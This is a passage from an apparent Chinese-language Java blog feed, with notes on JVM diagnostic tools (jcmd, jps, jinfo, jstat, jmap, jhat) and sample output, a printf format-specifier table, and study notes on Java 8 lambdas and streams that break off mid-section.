PS C:\Users\Administrator&gt; jcmd 13204 VM.system_properties13204:#Thu Dec 02 11:03:17 CST 2021java.vendor=Oracle Corporationpreload.project.path=D\:/Workspace/GIT/XXXsun.java.launcher=SUN_STANDARDsun.management.compiler=HotSpot 64-Bit Tiered Compilerssun.nio.ch.bugLevel=idea.config.path=C\:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3idea.paths.selector=IntelliJIdea2021.3kotlin.daemon.client.alive.path="C\:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\kotlin-idea-6412110316068151676-is-running"os.name=Windows 10sun.boot.class.path=D\:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\resources.jar;D\:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\rt.jar;D\:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\sunrsasign.jar;D\:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\jsse.jar;D\:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\jce.jar;D\:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\charsets.jar;D\:\\Developer\\java\\jdk1.8.0_131\\jre\\lib\\jfr.jar;D\:\\Developer\\java\\jdk1.8.0_131\\jre\\classessun.desktop=windowsidea.plugins.path=C\:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/pluginsjava.vm.specification.vendor=Oracle Corporationjava.runtime.version=1.8.0_131-b11io.netty.serviceThreadPrefix=Nettyuser.name=Administrator...
jcmd [pid] VM.flags： 查看 JVM 的启动参数
PS C:\Users\Administrator&gt; jcmd 13204 VM.flags13204:-XX:CICompilerCount=4 -XX:InitialHeapSize=268435456 -XX:MaxHeapSize=1073741824 -XX:MaxNewSize=357564416 -XX:MinHeapDeltaBytes=524288 -XX:NewSize=89128960 -XX:OldSize=179306496 -XX:+UseCompressedClassPointers -XX:+UseCompressedOops -XX:+UseFastUnorderedTimeStamps -XX:-UseLargePagesIndividualAllocation -XX:+UseParallelGCPS C:\Users\Administrator&gt;
jcmd [pid] PerfCounter.print：查看 JVM 性能相关的参数
PS C:\Users\Administrator&gt; jcmd 13204 PerfCounter.print13204:java.ci.totalTime=26357322java.cls.loadedClasses=3480java.cls.sharedLoadedClasses=0java.cls.sharedUnloadedClasses=0java.cls.unloadedClasses=15java.property.java.class.path="D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-launcher.jar;D:/Developer/java/jdk1.8.0_131/lib/tools.jar"java.property.java.endorsed.dirs=""""java.property.java.ext.dirs="D:\Developer\java\jdk1.8.0_131\jre\lib\ext;C:\Windows\Sun\Java\lib\ext"java.property.java.home="D:\Developer\java\jdk1.8.0_131\jre"......
jcmd [pid] GC.run：执行GC
对 JVM 执行 java.lang.System.gc()
PS C:\Users\Administrator&gt; jcmd 13204 GC.run13204:Command executed successfully
jcmd [pid] GC.run_finalization：执行FULL GC
对 JVM 执行 java.lang.System.runFinalization()
PS C:\Users\Administrator&gt; jcmd 13204 GC.run_finalization13204:Command executed successfully
补充：
system.gc()和system.runFinalization()区别作用：  System.gc(); //告诉垃圾收集器打算进行垃圾收集，而垃圾收集器进不进行收集是不确定的 System.runFinalization();  //强制调用已经失去引用的对象的finalize方法 // java中的finalize()方法// 当垃圾收集器认为没有指向对象实例的引用时，会在销毁该对象之前调用finalize() 方法。// 该方法最常见的作用是确保释放实例占用的全部资源。java并不保证定时为对象实例调用该方法，甚至不保证方法会被调用，所以该方法不应该用于正常内存处理。
jcmd [pid] VM.command_line：查看 JVM 的启动命令行
PS C:\Users\Administrator&gt; jcmd 13204 VM.command_line13204:VM Arguments:jvm_args: -Xmx1024m -Djava.awt.headless=true  。。。 -Dtmh.generate.line.numbers=truejava_command: org.jetbrains.jps.cmdline.Launcher D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders-6.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-javac-extension-1.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/util.jar;。。。D:/Developer/java/jdk1.8.0_131/lib/tools.jarLauncher Type: SUN_STANDARD
jps：列出系统中所有的JAVA应用程序

概述

​	jps 命令类似与 linux 的 ps 命令，但是它只列出系统中所有的 Java 应用程序。 通过 jps 命令可以方便地查看 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息。
​	如果在 linux 中想查看 java 的进程，一般我们都需要 ps -ef | grep java 来获取进程 ID。 如果只想获取 Java 程序的进程，可以直接使用 jps 命令来直接查看。
PS C:\Users\Administrator&gt; jps162085712 Jps13204 Launcher


用法
PS C:\Users\Administrator&gt; jps -helpusage: jps [-help]       jps [-q] [-mlvV] [&lt;hostid&gt;]Definitions:    &lt;hostid&gt;:      &lt;hostname&gt;[:&lt;port&gt;]
参数说明



参数
说明




-q
只输出进程 ID


-m
输出传入 main 方法的参数


-l
输出完全的包名，应用主类名，jar的完全路径名


-v
输出jvm参数


-V
输出通过flag文件传递到JVM中的参数





示例


jps
无参数：显示进程的ID 和 启动类的名称。


jps -q
参数 -q 只输出进程ID，而不显示出类的名称
PS C:\Users\Administrator&gt; jps -q16208132046132


jps -m
可以输出传递给 Java 进程（main 方法）的参数。
PS C:\Users\Administrator&gt; jps -m1620810244 Jps -m13204 Launcher D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-builders-6.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/jps-javac-extension-1.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/util.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/annotations.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/3rd-party-rt.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/jna.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/kotlin-stdlib-jdk8.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/protobuf.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/platform-api.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/jps-model.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/javac2.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/lib/forms_rt.jar;D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1/plugins/java/lib/qdox.jar;D:/Developer


jps -l
可以输出主函数的完整路径（类的全路径）。
PS C:\Users\Administrator&gt; jps -l1620813204 org.jetbrains.jps.cmdline.Launcher5080 sun.tools.jps.Jps


jsp -v
可以显示传递给 Java 虚拟机的参数。
PS C:\Users\Administrator&gt; jps -v16208  exit -Xms128m -Xmx750m -XX:ReservedCodeCacheSize=512m -XX:+IgnoreUnrecognizedVMOptions -XX:+UseG1GC -XX:SoftRefLRUPolicyMSPerMB=50 -XX:CICompilerCount=2 -XX:+HeapDumpOnOutOfMemoryError -XX:-OmitStackTraceInFastThrow -ea -Dsun.io.useCanonCaches=false -Djdk.http.auth.tunneling.disabledSchemes="" -Djdk.attach.allowAttachSelf=true -Djdk.module.illegalAccess.silent=true -Dkotlinx.coroutines.debug=off -Xms3058m -Xmx5500m -XX:ReservedCodeCacheSize=2048m -XX:SoftRefLRUPolicyMSPerMB=100 -Djb.vmOptionsFile=C:\Users\Administrator\AppData\Roaming\JetBrains\IntelliJIdea2021.3\idea64.exe.vmoptions -Djava.system.class.loader=com.intellij.util.lang.PathClassLoader -Didea.vendor.name=JetBrains -Didea.paths.selector=IntelliJIdea2021.3 -Didea.jre.check=true -Dsplash=true -Dide.native.launcher=true -XX:ErrorFile=C:\Users\Administrator\java_error_in_idea64_%p.log -XX:HeapDumpPath=C:\Users\Administrator\java_error_in_idea64.hprof6708 RemoteMavenServer36 -Djava.awt.headless=true -Dmaven.defaultProjectBuilder.disableGlobalModelCache=true -Didea.version=2021.3 -Didea.maven.embedder.version=3.8.1 -Xmx1024m -Dmaven.ext.class.path=D:\Developer\JetBrains\IntelliJ IDEA 2021.1.1\plugins\maven\lib\maven-event-listener.jar -Dfile.encoding=GBK16968 Jps -Dapplication.home=D:\Developer\java\jdk1.8.0_131 -Xms8m16716 Launcher -Xmx1024m -Djava.awt.headless=true -Djava.endorsed.dirs="" -Dpreload.project.path=D:/Workspace/OWN/Learn -Dpreload.config.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/options -Dexternal.project.config=C:\Users\Administrator\AppData\Local\JetBrains\IntelliJIdea2021.3\external_build_system\learn.11acc208 -Dcompile.parallel=true -Drebuild.on.dependency.change=true -Djdt.compiler.useSingleThread=true -Daether.connector.resumeDownloads=false -Dio.netty.initialSeedUniquifier=1264189494698199162 -Dfile.encoding=GBK -Duser.language=zh -Duser.country=CN -Didea.paths.selector=IntelliJIdea2021.3 -Didea.home.path=D:/Developer/JetBrains/IntelliJ IDEA 2021.1.1 -Didea.config.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3 -Didea.plugins.path=C:/Users/Administrator/AppData/Roaming/JetBrains/IntelliJIdea2021.3/plugins -Djps.log.dir=C:/Users/Administrator/AppData/Local/JetBrains/IntelliJIdea2021.3/log/build-log -Djps.fallback.jdk.home=D:/Developer/JetBrains/IntelliJ IDEA 202




jinfo：实时查看和调整虚拟机运行参数
命令格式 : jinfo [option] [args]  LVMID
使用jps命令的**-v**参数可以查看虚拟机启动时显式指定的参数列表，但如果想知道未被显式指定的参数的系统默认值，除了去找资料外，就只能使用jinfo的-flag选项进行查询了
（如果只限于JDK 1.6或以上版本的话，使用java-XX：+PrintFlagsFinal查看参数默认值也是一个很好的选择），jinfo还可以使用-sysprops选项把虚拟机进程的System.getProperties()的内容打印出来。这个命令在JDK 1.5时期已经随着Linux版的JDK发布，当时只提供了信息查询的功能，JDK 1.6之后，jinfo在Windows和Linux平台都有提供，并且加入了运行期修改参数的能力，可以使用-flag[+|-]name或者-flag name=value修改一部分运行期可写的虚拟机参数值。JDK 1.6中，jinfo对于Windows平台功能仍然有较大限制，只提供了最基本的-flag选项。
option参数:



参数
说明




-flag
输出指定args参数的值


-flags
不需要args参数，输出所有JVM参数的值


-sysprops
输出系统属性，等同于System.getProperties()











jstat：虚拟机统计信息监视工具

它可以显示出虚拟机进程中的类装载、内存、垃圾收集、JIT编译等运行数据。

命令格式
：  jstat [option] LVMID [interval] [count]



参数
说明




[option]
操作参数


LVMID
本地虚拟机进程ID


[interval]
连续输出的时间间隔


[count]
连续输出的次数



对于命令格式中的VMID与LVMID需要特别说明一下：
如果是本地虚拟机进程，VMID与LVMID是一致的;
如果是远程虚拟机进程，那LVMID的格式应当是：protocol://lvmid@hostname:port/servername
参数interval和count代表查询间隔(单位毫秒)和次数，如果省略这两个参数，说明只查询一次。
举例：假设需要每250毫秒查询一次进程2764垃圾收集状况，一共查询20次，那命令应当是：jstat -gc 2764 250 20
选项option代表着用户希望查询的虚拟机信息，主要分为3类：类装载、垃圾收集、运行期编译状况，具体选项及作用请参考表4-3中的描述。

option 参数详解



参数
说明




-class：监视类装载、卸载数量、总空间以及耗费的时间
Loaded : 加载class的数量Bytes : class字节大小Unloaded : 未加载class的数量Bytes : 未加载class的字节大小Time : 加载时间


-compiler：输出JIT编译过的方法数量耗时等
Compiled : 编译数量 Failed : 编译失败数量 Invalid : 无效数量 Time : 编译耗时 FailedType : 失败类型 FailedMethod : 失败方法的全限定名


-gc：垃圾回收堆的行为统计
DEMO：每250毫秒查询一次进程2764垃圾收集状况，一共查询20次：新生代Eden区（E，表示Eden）使用了6.2%的空间两个Survivor区（S0、S1，表示Survivor0、Survivor1）里面都是空的老年代（O，表示Old）和永久代（P，表示Permanent）则分别使用了41.42%和47.20%的空间。程序运行以来共发生Minor GC（YGC，表示Young GC）16次，总耗时0.105秒，发生Full GC（FGC，表示Full GC）3次，Full GC总耗时（FGCT，表示Full GC Time）为0.472秒，所有GC总耗时（GCT，表示GC Time)为0.577秒。C 即Capacity 总容量，U 即Used 已使用的容量.S0C : survivor0区的总容量 S1C : survivor1区的总容量 S0U : survivor0区已使用的容量 S1C : survivor1区已使用的容量 EC : Eden区的总容量 EU : Eden区已使用的容量 OC : Old区的总容量 OU : Old区已使用的容量 PC 当前perm的容量 (KB) PU perm的使用 (KB) YGC : 新生代垃圾回收次数 YGCT : 新生代垃圾回收时间 FGC : 老年代垃圾回收次数 FGCT : 老年代垃圾回收时间 GCT : 垃圾回收总消耗时间


-gccapacity：同-gc，不过还会输出Java堆各区域使用到的最大、最小空间
jstat -gccapacity 1262NGCMN : 新生代占用的最小空间 NGCMX : 新生代占用的最大空间 OGCMN : 老年代占用的最小空间 OGCMX : 老年代占用的最大空间 OGC：当前年老代的容量 (KB) OC：当前年老代的空间 (KB) PGCMN : perm占用的最小空间 PGCMX : perm占用的最大空间


-gcutil：同-gc，不过输出的是已使用空间占总空间的百分比



-gccause： 垃圾收集统计概述（同-gcutil），附加最近两次垃圾回收事件的原因
 LGCC：最近垃圾回收的原因GCC：当前垃圾回收的原因


-gcnew：统计新生代的行为
 TT：Tenuring threshold(提升阈值)MTT：最大的tenuring thresholdDSS：survivor区域大小 (KB)


-gcnewcapacity：新生代与其相应的内存空间的统计
jstat -gcnewcapacity 28920 NGC:当前年轻代的容量 (KB)S0CMX:最大的S0空间 (KB)S0C:当前S0空间 (KB)ECMX:最大eden空间 (KB)EC:当前eden空间 (KB)


-gcold：统计旧生代的行为
jstat -gcold 28920


-gcoldcapacity：统计旧生代的大小和空间
jstat -gcoldcapacity 28920


-gcpermcapacity：永生代行为统计
jstat -gcpermcapacity 28920


-printcompilation：hotspot编译方法统计
 Compiled：被执行的编译任务的数量Size：方法字节码的字节数Type：编译类型Method：编译方法的类名和方法名。类名使用”/” 代替 “.” 作为空间分隔符. 方法名是给出类的方法名. 格式是一致于HotSpot – XX:+PrintComplation 选项



jmap

Java内存映像工具
jmap（Memory Map for Java）命令用于生成堆转储快照（一般称为heapdump或dump文件）。
如果不使用jmap命令，要想获取Java堆转储快照，还有一些比较“暴力”的手段：譬如加-XX：+HeapDumpOnOutOfMemoryError参数，可以让虚拟机在OOM异常出现之后自动生成dump文件，通过-XX：+HeapDumpOnCtrlBreak参数则可以使用[Ctrl]+[Break]键让虚拟机生成dump文件，又或者在Linux系统下通过Kill-3命令发送进程退出信号“吓唬”一下虚拟机，也能拿到dump文件。
jmap的作用并不仅仅是为了获取dump文件，它还可以查询finalize执行队列、Java堆和永久代的详细信息，如空间使用率、当前用的是哪种收集器等。
和jinfo命令一样，jmap有不少功能在Windows平台下都是受限的，除了生成dump文件的**-dump**选项和用于查看每个类的实例、空间占用统计的-histo选项在所有操作系统都提供之外，其余选项都只能在Linux/Solaris下使用。

命令格式
jmap [option] LVMID
option参数



参数
说明




dump
生成堆转储快照，格式为:    -dump:[live, ] format=b,file=,  其中live子参数说明是否只dump出存活的对象。


finalizerinfo
显示在F-Queue队列等待Finalizer线程执行finalizer方法的对象


heap
显示Java堆详细信息


histo
显示堆中对象的统计信息，GC使用的算法，heap的配置及wise heap的使用情况可以用此来判断内存目前的使用情况以及垃圾回收情况


permstat
to print permanent generation statistics


F
当-dump没有响应时，强制生成dump快照



jmap -heap 28920：打印内存信息
C:\Users\Administrator&gt;jmap -heap 7676Attaching to process ID 7676, please wait...Debugger attached successfully.Server compiler detected.JVM version is 25.131-b11using thread-local object allocation.Parallel GC with 8 thread(s) # GC 方式Heap Configuration: # 堆内存初始化配置   MinHeapFreeRatio         = 0  # 对应jvm启动参数-XX:MinHeapFreeRatio设置JVM堆最小空闲比率(default 40)   MaxHeapFreeRatio         = 100 # 对应jvm启动参数 -XX:MaxHeapFreeRatio设置JVM堆最大空闲比率(default 70)   MaxHeapSize              = 8562671616 (8166.0MB) # 对应jvm启动参数-XX:MaxHeapSize=设置JVM堆的最大大小   NewSize                  = 178782208 (170.5MB) # 对应jvm启动参数-XX:NewSize=设置JVM堆的‘新生代’的默认大小   MaxNewSize               = 2854223872 (2722.0MB) # 对应jvm启动参数-XX:MaxNewSize=设置JVM堆的‘新生代’的最大大小   OldSize                  = 358088704 (341.5MB) # 对应jvm启动参数-XX:OldSize=&lt;value&gt;:设置JVM堆的‘老生代’的大小   NewRatio                 = 2 # 对应jvm启动参数-XX:NewRatio=:‘新生代’和‘老生代’的大小比率   SurvivorRatio            = 8 # 对应jvm启动参数-XX:SurvivorRatio=设置年轻代中Eden区与Survivor区的大小比值   MetaspaceSize            = 21807104 (20.796875MB)   CompressedClassSpaceSize = 1073741824 (1024.0MB)   MaxMetaspaceSize         = 17592186044415 MB   G1HeapRegionSize         = 0 (0.0MB)Heap Usage: # 堆内存使用情况PS Young GenerationEden Space: # Eden区内存分布   capacity = 2394423296 (2283.5MB) # Eden区总容量   used     = 42456832 (40.489990234375MB) # Eden区已使用   free     = 2351966464 (2243.010009765625MB) # Eden区剩余容量   1.7731548164823736% used  # Eden区使用比率From Space: # 其中一个Survivor区的内存分布   capacity = 212336640 (202.5MB)   used     = 0 (0.0MB)   free     = 212336640 (202.5MB)   0.0% used To Space: # 另一个Survivor区的内存分布   capacity = 221773824 (211.5MB)   used     = 0 (0.0MB)   free     = 221773824 (211.5MB)   0.0% usedPS Old Generation # 当前的Old区内存分布   capacity = 1039138816 (991.0MB)   used     = 487669936 (465.0782928466797MB)   free     = 551468880 (525.9217071533203MB)   46.93020109451864% used49107 interned Strings occupying 4515704 bytes.
jmap -histo:live 7676| more：打印堆的对象统计，包括对象数、内存大小等等

因为在dump:live前会进行full gc，如果带上live则只统计活对象，因此不加live的堆大小要大于加live堆的大小

 num    #instances       #bytes  class name----------------------------------------------   1:       264504      133851  [C   2:       266752       64020  java.lang.String   3:       197556       63217  java.util.HashMap$Node   4:         9794       54849  com.ssp.user.model.Userinfo   5:        58254       36364  [Ljava.lang.Object;   6:        11204       18546  [Ljava.util.HashMap$Node;   7:        72959       17510  java.util.ArrayList   8:         4897       13321  com.ssp.model.WareInfo   9:        16716        8023  java.util.TreeMap  10:        15798        7583  java.util.HashMap  11:        17063        6825  java.util.TreeMap$Entry  12:        11155        6247  java.util.LinkedHashMap  13:        16706        5346  java.util.Collections$SynchronizedMap  14:         5635        4959  java.lang.reflect.Method  15:         4895        4699  com.ssp.index.model.DataAuthor  16:          795        4262  [B  17:        16694        4006  jeasy.analysis.Dictionary  18:        16779        2684  java.lang.Character  19:         8271        2646  java.util.concurrent.ConcurrentHashMap$Node  20:          947        1737  [I  21:         1336        1502  java.lang.Class  22:         2658        1063  java.util.LinkedHashMap$Entry  23:         2212        1062  org.aspectj.weaver.reflect.ShadowMatchImpl  24:          432         899  com.ssp.model.report.Aport  25:         5177         828  java.util.LinkedHashMap$LinkedKeySet  26:         3658         820  [Ljava.lang.Class;-- More  --
xml class name是对象类型，说明如下：



显示
说明




B
byte


C
char


D
double


F
float


I
int


J
long


Z
boolean


[ 数组
如[I表示int[]


[L+类名
其他对象



jmap -finalizerinfo 7676：打印等待回收对象的信息
C:\Users\Administrator&gt;  jmap -finalizerinfo 7676Attaching to process ID 7676, please wait...Debugger attached successfully.Server compiler detected.JVM version is 25.131-b11Number of objects pending for finalization: 0
可以看到当前F-QUEUE队列中并没有等待Finalizer线程执行finalizer方法的对象。
jmap -dump:live,format=b,file=dump.hprof 7676 : 提取MAT分析文件
dump.hprof 这个后缀是为了后续可以直接用MAT(Memory Anlysis Tool)打开。
jhat：虚拟机堆转储快照分析工具
jhat（JVM Heap Analysis Tool）命令与jmap搭配使用，来分析jmap生成的堆转储快照。
jhat内置了一个微型的HTTP/HTML服务器，生成dump文件的分析结果后，可以在浏览器中查看。
不过实事求是地说，在实际工作中，除非手上真的没有别的工具可用，否则一般都不会去直接使用jhat命令来分析dump文件，主要原因有二：
一是一般不会在部署应用程序的服务器上直接分析dump文件，即使可以这样做，也会尽量将dump文件复制到其他机器。
二是用于分析的机器一般也是服务器，由于加载dump快照文件需要比生成dump更大的内存，所以一般在64位JDK、大内存的服务器上进行分析，因为分析工作是一个耗时而且消耗硬件资源的过程，既然都要在其他机器进行，就没有必要受到命令行工具的限制了；
另一个原因是jhat的分析功能相对来说比较简陋，VisualVM，以及专业用于分析dump文件的Eclipse Memory Analyzer、IBM HeapAnalyzer等工具，都能实现比jhat更强大更专业的分析功能。
命令格式：  jhat [option] [dumpfile]
OPTION参数：



参数
说明




-stack false|true
默认值为 true关闭对象分配调用栈跟踪(tracking object allocation call stack) 如果分配位置信息在堆转储中不可用，则必须将此标志设置为 false


-refs false|true
关闭对象引用跟踪(tracking of references to objects)。  默认值为 true。  默认情况下, 返回的指针是指向其他特定对象的对象,如反向链接或输入引用(referrers or incoming references), 会统计/计算堆中的所有对象。


-port port-number
设置 jhat HTTP server 的端口号。  默认值 7000


-exclude exclude-file
指定对象查询时需要排除的数据成员列表文件(a file that lists data members that should be excluded from the reachable objects query)。 例如, 如果文件列列出了 java.lang.String.value , 那么当从某个特定对象 Object o 计算可达的对象列表时, 引用路径涉及 java.lang.String.value 的都会被排除。


-baseline exclude-file
指定一个基准堆转储(baseline heap dump)。 在两个 heap dumps 中有相同 object ID 的对象会被标记为不是新的(marked as not being new)其他对象被标记为新的(new)。   在比较两个不同的堆转储时很有用


-debug int
设置 debug 级别. 0 表示不输出调试信息。 值越大则表示输出更详细的 debug 信息。


-version
启动后只显示版本信息就退出


-J&lt; flag &gt;
因为 jhat 命令实际上会启动一个JVM来执行, 通过 -J 可以在启动JVM时传入一些启动参数。  例如, -J-Xmx512m 则指定运行 jhat 的Java虚拟机使用的最大堆内存为 512 MB如果需要使用多个JVM启动参数,则传入多个 -Jxxxxxx.







jhat dump.hprof：查看之前jmap生成的 dump.hprof
C:\Users\Administrator&gt;jhat dump.hprofReading from dump.hprof...Dump file created Wed Apr 26 10:44:41 CST 2023Snapshot read, resolving...Resolving 185857 objects...Chasing references, expect 37 dots.....................................Eliminating duplicate references.....................................Snapshot resolved.Started HTTP server on port 7000Server is ready.
屏幕显示 Server is ready的提示后，用户在浏览器中键入http://localhost:7000/就可以看到分析结果

分析结果默认是以包为单位进行分组显示。
分析内存泄漏问题主要会使用到其中的“Heap Histogram”（与jmap -histo功能一样）与OQL页签的功能。
前者可以找到内存中总容量最大的对象，后者是标准的对象查询语言，使用类似SQL的语法对内存中的对象进行查询统计

]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中printf的用法总结</title>
    <url>/20221027/c3539d05.html</url>
    <content><![CDATA[


格式
说明
补充说明




%c
单个字符



%d
十进制整数
%d：按整型数据的实际长度输出%md：m为指定的输出字段的宽度。如果数据的位数小于m，则左端补以空格，若大于m，则按实际位数输出%ld：输出长整型数据


%f
十进制浮点数
%f不指定宽度，整数部分全部输出，并输出6位小数%m.nf输出共占m列，其中有n位小数，如数值宽度小于m左端补空格%-m.nf输出共占n列，其中有n位小数，如数值宽度小于m右端补空格


%o
八进制数
%o、%#o： “#”号会将八进制符号“0X”显示出来。大写“X”，则会显示大写英文字符


%s
字符串
%s例如:printf(“%s”, “CHINA”) 输出"CHINA"字符串（不包括双引号）%ms输出的字符串占m列，如字符串本身长度大于m，则突破获m的限制,将字符串全部输出。若串长小于m，则左补空格%-ms如果串长小于m，则在m列范围内，字符串向左靠，右补空格%m.ns输出占m列，但只取字符串中左端n个字符。这n个字符输出在m列的右侧，左补空格%-m.ns其中m、n含义同上，n个字符输出在m列范围的左侧，右补空格。如果n&gt;m，则自动取n值，即保证n个字符正常输出


%x
十六进制数
%x、%X、%#x、%#X： “#”号会将十六进制符号“0X”显示出来。大写“X”，则会显示大写英文字符


%%
输出百分号%









]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 8 in Action【汪文君】</title>
    <url>/20221022/725f0c76.html</url>
    <content><![CDATA[源码： Java8 In Action
笔记来源：https://waltyou.github.io
全书脑图


梳理脉络
通过脑图可以看出，全书分为四个部分：


基础知识，重点是为何关心java8，行为参数化和lambda


函数式编程，重点是全面系统的介绍Stream


Java8的其他改善点

重构/测试/调试
默认方法（Default Function）
Optional替代null
CompletableFuture 组合式异步编程
日期时间API



Java8之上：对函数式编程的思考，函数编程的技巧，与Scala的比较


行为参数化

Why
应对不断变化的需求，避免啰嗦，而且不打破DRY（Don’t Repeat Yourself）规则。
What
简单讲：把方法（你的代码）作为参数传递给另一个方法。
复杂讲： 让方法接受多种行为（或战略）作为参数，并在内部使用，来完成不同的行为。
How
Example：用一个Comparator排序Apple，使用Java 8中List默认的sort方法。

// java.util.Comparatorpublic interface Comparator&lt;T&gt; {    public int compare(T o1, T o2);}// 匿名类写法inventory.sort(new Comparator&lt;Apple&gt;() {    public int compare(Apple a1, Apple a2){        return a1.getWeight().compareTo(a2.getWeight());    }});// lambda写法inventory.sort(    (Apple a1, Apple a2) -&gt;    a1.getWeight().compareTo(a2.getWeight()));
匿名函数lambda
使用lambda之前，需要了解两个概念：函数式接口 和函数描述符
1. 函数式接口
定义：只定义一个抽象方法的接口
@FunctionalInterface：标注用于表示该接口会设计成一个函数式接口。
Java 8 提供了一些新的函数式接口， 位置：java.util.function

2. 函数描述符
函数式接口的抽象方法的签名基本上就是Lambda表达式的签名。如下：
() -&gt; void(Apple) -&gt; int(Apple, Apple) -&gt; boolean
3. 实现细节
类型检查
上下文中Lambda表达式需要的类型称为目标类型

同样的Lambda，不同的函数式接口
特殊的void兼容规则：如果一个Lambda的主体是一个语句表达式 它就和一个返回void的函数描述符兼容。

类型推断
编译器可以了解Lambda表达式的参数类型，这样就可以在Lambda语法中省去标注参数类型。
使用局部变量
int portNumber = 1337; Runnable r = () -&gt; System.out.println(portNumber); 
注意： Lambda可以没有限制地捕获（也就是在其主体中引用）实例变量和静态变量。但局部变量必须显式声明为final，或事实上是final。
原因：
1）局部变量保存在栈上，并且隐式表示它们仅限于其所在线程，如果允许捕获可改变的局部变量，就会引发造成线程不安全新的可能性；
2）不鼓励你使用改变外部变量的典型命令式编程模式
方法引用（method reference）
目标引用放在分隔符::前, 方法的名称放在后面。
inventory.sort(comparing(Apple::getWeight));
方法引用主要有三类:

指向静态方法的方法引用: Integer::parseInt
指向任意类型实例方法的方法引用: String::length
指向现有对象的实例方法的方法引用: expensiveTransaction::getValue

//改写Function&lt;String, Integer&gt; stringToInteger = (String s) -&gt; Integer.parseInt(s);Function&lt;String, Integer&gt; stringToInteger = Integer::parseInt;BiPredicate&lt;List&lt;String&gt;, String&gt; contains = (list, element) -&gt; list.contains(element);BiPredicate&lt;List&lt;String&gt;, String&gt; contains = List::contains;
复合Lambda表达式 (因为引入了默认方法)
1. 比较器复合
Comparator&lt;Apple&gt; c = Comparator.comparing(Apple::getWeight);// 逆序inventory.sort(comparing(Apple::getWeight).reversed());// 比较器链inventory.sort(comparing(Apple::getWeight)    .reversed()    .thenComparing(Apple::getCountry))
2. 谓词复合 negate、and和or
//取非Predicate&lt;Apple&gt; notRedApple = redApple.negate();//and操作Predicate&lt;Apple&gt; redAndHeavyApple = redApple.and(a -&gt; a.getWeight() &gt; 150);//and + or操作Predicate&lt;Apple&gt; redAndHeavyAppleOrGreen = redApple.and(a -&gt; a.getWeight() &gt; 150).or(a -&gt; "green".equals(a.getColor()));
从左向右确定优先级.
3. 函数复合
Function提供了andThen(), compose()
Function&lt;Integer, Integer&gt; f = x -&gt; x + 1; Function&lt;Integer, Integer&gt; g = x -&gt; x * 2; // expect: (2 + 1) * 2 = 4// f(g(x))System.out.println(f.andThen(g).apply(1));// expect: 1 * 2 + 1 = 3// g(f(x))System.out.println(f.compose(g).apply(1));
复合Lambda表达式可以用来创建各种转型流水线。
Stream定义
从（支持数据处理操作的源）生成的（元素序列）
元素序列：流提供了一个接口,可以访问特定元素类型的一组有序值。
源：集合、数组或输入/输出资源
数据处理操作：filter 、 map 、 reduce 、 find 、 match 、 sort等，可顺序，可并行。
两个重要特点：

流水线：多个操作可以链接起来
内部迭代：流的迭代操作是在背后进行的，优点：透明地并行处理;优化处理顺序
注意：链中的方法调用都在排队等待,直到调用 collect 。

Stream操作
概念
两大类操作
1. 中间操作：会返回另一个流，map，filter等
2. 终端操作：从流的流水线生成结果，collect，foreach， count等
使用三要素
+ 一个数据源(如集合)来执行一个查询;
+ 一个中间操作链,形成一条流的流水线;
+ 一个终端操作,执行流水线,并能生成结果。
dishes.stream()    .filter(d -&gt; d.getCalories() &lt; 400)    .sorted(comparing(Dish::getCalories))    .map(Dish::getName)    .collect(toList());
常用函数


筛选和切片 Filtering and slicing
filter()，distinct()，limit(n), skip(n)


映射 Mapping

map: 对流中每一个元素应用函数
flatmap: 把一个流中的每个值都换成另一个流,然后把所有的流连接起来成为一个流。



查找和匹配 Finding and matching

anyMatch: 流中是否有一个元素能匹配给定的谓词, 方法返回一个 boolean
allMatch: 流中的元素是否都能匹配给定的谓词, 方法返回一个 boolean
noneMatch: 流中没有任何元素与给定的谓词匹配
findAny: 返回当前流中的任意元素(Optional)
findFirst: 找到第一个元素



归约 Reducing
将流中所有元素反复结合起来。

元素求和



int sum = numbers.stream().reduce(0, Integer::sum);Optional&lt;Integer&gt; sum = numbers.stream().reduce(Integer::sum);

最大值，最小值

Optional&lt;Integer&gt; max = numbers.stream().reduce(Integer::max);Optional&lt;Integer&gt; min = numbers.stream().reduce(Integer::min);

